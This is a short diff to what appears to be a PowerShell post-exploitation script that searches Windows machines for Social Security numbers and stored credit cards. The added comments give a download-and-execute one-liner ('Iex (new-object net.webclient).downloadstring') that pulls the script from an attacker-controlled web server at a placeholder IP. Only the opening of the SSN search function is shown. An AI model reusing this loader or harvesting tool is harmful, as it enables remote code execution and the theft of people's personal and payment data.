@@ -1,3 +1,8 @@
+# This post script will search Windows systems for sensitive personally identifiable information (PII) and stored credit cards.
+# You can grab it from your apache root/simpleHTTP server with:
+# Iex (new-object net.webclient).downloadstring(“http://*IP*/*C:\Users\*User*\Documents*)
+ 
+
 function Get-SSN 
 {
 # This will search for Social Security Numbers
